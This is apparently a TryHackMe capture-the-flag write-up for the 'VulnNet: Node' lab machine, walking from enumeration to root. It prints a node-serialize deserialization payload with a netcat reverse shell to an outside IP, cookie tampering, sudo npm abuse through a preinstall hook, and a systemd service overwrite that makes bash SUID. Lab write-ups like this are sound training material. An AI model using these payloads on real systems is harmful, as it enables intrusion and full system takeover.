# TryHackMe - VulnNet: Node

**Machine Name:** VulnNet: Node

**Difficulty:** Medium 

**Category:** Web Application / Enumeration / Privilege Escalation

**IP Address:** 10.114.135.104

---

## Executive Summary
The VulnNet: Node machine presents a multi-stage attack path focusing on application-layer vulnerabilities and Linux system misconfigurations. Initial access was achieved by discovering a Base64-encoded session cookie and exploiting an Insecure Deserialization vulnerability (CVE-2017-5941) within the Node.js `node-serialize` library to execute a reverse shell. 

Post-exploitation involved a two-step privilege escalation. First, horizontal privilege escalation to the `serv-manage` user was achieved by abusing overly permissive `sudo` rights on the `npm` package manager. Finally, vertical privilege escalation to `root` was accomplished by exploiting a group-writable systemd service file triggered by a systemd timer, allowing for the creation of a SUID root bash binary. 

---

## Phase 1: Enumeration

### Port Scanning
I initiated the reconnaissance phase with a ping check, followed by an Nmap scan to identify open ports and services:
```bash
ping 10.114.135.104
nmap -p- -sV -sC -Pn --min-rate 1000 10.114.135.104
```

**Findings:**
* **Port 22 (SSH):** Open. Running OpenSSH 8.2p1 Ubuntu.
* **Port 8080 (HTTP):** Open. Running Node.js Express framework. 

### Web Reconnaissance
Navigating to port 8080 initially threw an `SSL_ERROR_RX_RECORD_TOO_LONG` error in Firefox because the browser attempted an HTTPS connection. I bypassed this by manually forcing a standard HTTP connection using `curl` and the browser:
```bash
curl [http://10.114.135.104:8080](http://10.114.135.104:8080)
```
The web application resolved to a blog titled "VulnNet - Your reliable news source."

To map out the application's attack surface, I ran a directory brute-force using Gobuster:
```bash
gobuster dir -u [http://10.114.135.104:8080](http://10.114.135.104:8080) -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt,zip,bak,inc -t 50
```

**Discovered Endpoints:**
* `/login` (Status: 200) - A user authentication page.
* `/css/` (Status: 301) - Stylesheet directory.
* `/img/` (Status: 301) - Image directory (returns "Cannot GET /img/" when accessed directly via `curl http://10.114.135.104:8080/img/`, indicating directory listing is disabled).

---

## Phase 2: Vulnerability Discovery

### Client-Side Trust & Cookie Manipulation
While investigating the web application, I checked the browser's storage/developer tools for session management mechanisms. I discovered a session cookie containing a URL-encoded, Base64 string:

**Raw Cookie Value:** `eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ%3D%3D`

Decoding the string via the terminal revealed the following JSON structure:
```bash
echo "eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ==" | base64 -d
```
Output: `{"username":"Guest","isGuest":true,"encoding": "utf-8"}`

To test if the application was vulnerable to privilege escalation via cookie tampering, I modified the JSON to reflect an admin user:
`{"username":"Admin","isGuest":false,"encoding": "utf-8"}`

I re-encoded the payload to Base64:
```bash
echo -n '{"username":"Admin","isGuest":false,"encoding": "utf-8"}' | base64
```
Output: `eyJ1c2VybmFtZSI6IkFkbWluIiwiaXNHdWVzdCI6ZmFsc2UsImVuY29kaW5nIjogInV0Zi04In0=`

Then, I tested it via `curl` to see how the server responded:
```bash
curl -s -b "session=eyJ1c2VybmFtZSI6IkFkbWluIiwiaXNHdWVzdCI6ZmFsc2UsImVuY29kaW5nIjogInV0Zi04In0=" [http://10.114.135.104:8080/](http://10.114.135.104:8080/) | grep -i "welcome"
```
The server responded with "Welcome, Admin." However, injecting this cookie into the browser did not reveal a new admin dashboard. This indicated that while the cookie was being read, the vulnerability was not a simple IDOR, but rather a flaw in how Node.js was handling the data.

---

## Phase 3: Exploitation (Initial Access)

### Node.js Insecure Deserialization (CVE-2017-5941)
Suspecting an insecure deserialization vulnerability, I crafted a malicious payload targeting the `node-serialize` library. This library uses a specific syntax (`_$$ND_FUNC$$_`) to deserialize JavaScript functions. By appending `()` to the end of the function, I created an Immediately Invoked Function Expression (IIFE) that forces the server to execute a reverse shell the moment the cookie is parsed.

I generated the Base64-encoded reverse shell payload (replacing the IP with my Kali VPN IP):
```bash
echo -n '{"rce":"_$$ND_FUNC$$_function (){require('\''child_process'\'').exec('\''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.178.218 4444 >/tmp/f'\'', function(error, stdout, stderr) { console.log(stdout) });}()"}' | base64 -w 0
```

I started a Netcat listener on my attack machine:
```bash
nc -lvnp 4444
```

I then sent the malicious cookie to the server via `curl`:
```bash
curl -s -b "session=eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ3JtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8L2Jpbi9zaCAtaSAyPiYxfG5jIDE5Mi4xNjguMTc4LjIxOCA0NDQ0ID4vdG1wL2YnLCBmdW5jdGlvbihlcnJvciwgc3Rkb3V0LCBzdGRlcnIpIHsgY29uc29sZS5sb2coc3Rkb3V0KSB9KTt9KCkifQ==" [http://10.114.135.104:8080/](http://10.114.135.104:8080/)
```

The server immediately deserialized the payload, executing the reverse shell.

### Post-Exploitation Root Cause Analysis & Enumeration
Once the shell connected, I began enumerating the current directory and user context:
```bash
ls
cd ..
cd ..
ls
cd home
ls
ls -la
whoami
```
I identified my user as `www` and noticed a highly restricted folder named `serv-manage` (`drwxr-x--- 17 serv-manage serv-manage`). I then searched the entire system for the location of the `user.txt` flag:
```bash
find / -type f -name user.txt 2>/dev/null
```

To confirm the vulnerability that got me in, I read the `server.js` file:
```bash
cat /home/www/VulnNet-Node/server.js
```
The source code confirmed the developer insecurely passed the user-controlled Base64 cookie directly into `serialize.unserialize()`, allowing arbitrary code execution.

---

## Phase 4: Privilege Escalation (www -> serv-manage)

### Abusing Sudo Privileges (npm)
Continuing enumeration as `www`, I checked my sudo privileges:
```bash
sudo -l
```
I discovered that the `www` user could execute `npm` (Node Package Manager) as the `serv-manage` user without a password:
`(serv-manage) NOPASSWD: /usr/bin/npm`

I abused this feature by creating a malicious `package.json` file in the world-writable `/tmp` directory that executes a bash shell via the "preinstall" script hook:
```bash
cd /tmp
echo '{"scripts": {"preinstall": "/bin/bash"}}' > package.json
sudo -u serv-manage /usr/bin/npm -C /tmp --unsafe-perm i
```
By telling `npm` to install this package in `/tmp`, it triggered the `/bin/bash` command. Because `npm` was running as `serv-manage` via sudo, the resulting shell also belonged to `serv-manage`. 

I verified my new user, navigated to the home directory, and captured the user flag:
```bash
whoami
cd /home/serv-manage
ls
cat user.txt
```

---

## Phase 5: Privilege Escalation (serv-manage -> root)

### Identifying the Vector
As the new `serv-manage` user, I checked my sudo privileges again, as well as the home directory files and system cron jobs:
```bash
sudo -l
ls -la /home/serv-manage
cat /etc/crontab
```

The `sudo -l` output revealed a new set of privileges:
```text
(root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
(root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
(root) NOPASSWD: /bin/systemctl daemon-reload
```

*Methodology Note: Anytime `sudo -l` reveals the ability to run `systemctl` without a password, it is a highly probable path to `root`. Searching GTFOBins for `systemctl` confirms this vector.*

### Understanding systemd Timers & Services
In Linux, systemd timers act like scheduled cron jobs. 
* **The Timer (`vulnnet-auto.timer`):** Acts as an alarm clock scheduled to go off at specific intervals.
* **The Service (`vulnnet-job.service`):** Acts as the robot. When the timer goes off, the system reads this service file and executes the instructions inside as the `root` user.

I used `find` to locate the timer and checked its contents:
```bash
find / -name vulnnet-auto.* 2>/dev/null | xargs ls -la
cat /etc/systemd/system/vulnnet-auto.timer
```
The timer file pointed to a service file named `vulnnet-job.service`. I checked the permissions on that specific service file:
```bash
ls -la /etc/systemd/system/vulnnet-job.service
```
This revealed a critical developer misconfiguration: it was group-writable by my current user's group (`serv-manage`):
`-rw-rw-r-- 1 root serv-manage 197 Jan 24  2021 /etc/systemd/system/vulnnet-job.service`

### Modifying the Service for SUID Bash
Because I had write access to the service file, I overwrote the file with a payload designed to set the SUID (Set Owner User ID) bit on the `/bin/bash` binary:
```bash
echo '[Unit]
Description=Get Root
[Service]
Type=simple
ExecStart=/bin/chmod +s /bin/bash
[Install]
WantedBy=multi-user.target' > /etc/systemd/system/vulnnet-job.service
```
*Note on SUID: The command `/bin/chmod +s /bin/bash` tells Linux that anyone who opens this specific bash terminal from now on gets to run it with the privileges of its owner (Root).*

I then reloaded the systemd daemon (to force the system to read my new instructions) and manually started the timer (to trigger the execution immediately):
```bash
sudo /bin/systemctl daemon-reload
sudo /bin/systemctl start vulnnet-auto.timer
```

This successfully executed the `chmod +s` command as root in the background. Finally, I spawned a privileged bash shell using the `-p` flag (which tells bash to keep the newly granted SUID root privileges), verified my root status, and captured the final flag:
```bash
/bin/bash -p
whoami
cat /root/root.txt
```

---

## Conclusion
The VulnNet Node.js machine serves as an excellent practical demonstration of how minor misconfigurations can lead to total system compromise. The initial foothold highlights the severe danger of trusting user-supplied input—especially cookies—and using insecure deserialization methods to process data. Furthermore, the privilege escalation vectors illustrate the necessity of the Principle of Least Privilege: granting `sudo` access to binaries capable of arbitrary command execution (`npm`, `systemctl`) without tight restrictions is functionally equivalent to handing over root access. Finally, it reinforces the critical importance of strictly managing file permissions on system-level configuration files (like systemd services).

---

## Appendix: Technical Details & References

* **CVE-2017-5941 (Node.js node-serialize Insecure Deserialization):**
  * Description: An issue was discovered in the `node-serialize` package 0.0.4 for Node.js. Untrusted data passed into the `unserialize()` function can be exploited to achieve arbitrary code execution by passing a serialized JavaScript Object with an Immediately Invoked Function Expression (IIFE).
  * NVD Link: [https://nvd.nist.gov/vuln/detail/CVE-2017-5941](https://nvd.nist.gov/vuln/detail/CVE-2017-5941)

* **GTFOBins - npm Privilege Escalation:**
  * Reference for abusing sudo access to `npm` via custom `package.json` scripts:
  * Link: [https://gtfobins.github.io/gtfobins/npm/#sudo](https://gtfobins.github.io/gtfobins/npm/#sudo)

* **GTFOBins - systemctl Privilege Escalation:**
  * Reference for abusing sudo access to `systemctl` to spawn shells or modify system services:
  * Link: [https://gtfobins.github.io/gtfobins/systemctl/#sudo](https://gtfobins.github.io/gtfobins/systemctl/#sudo)
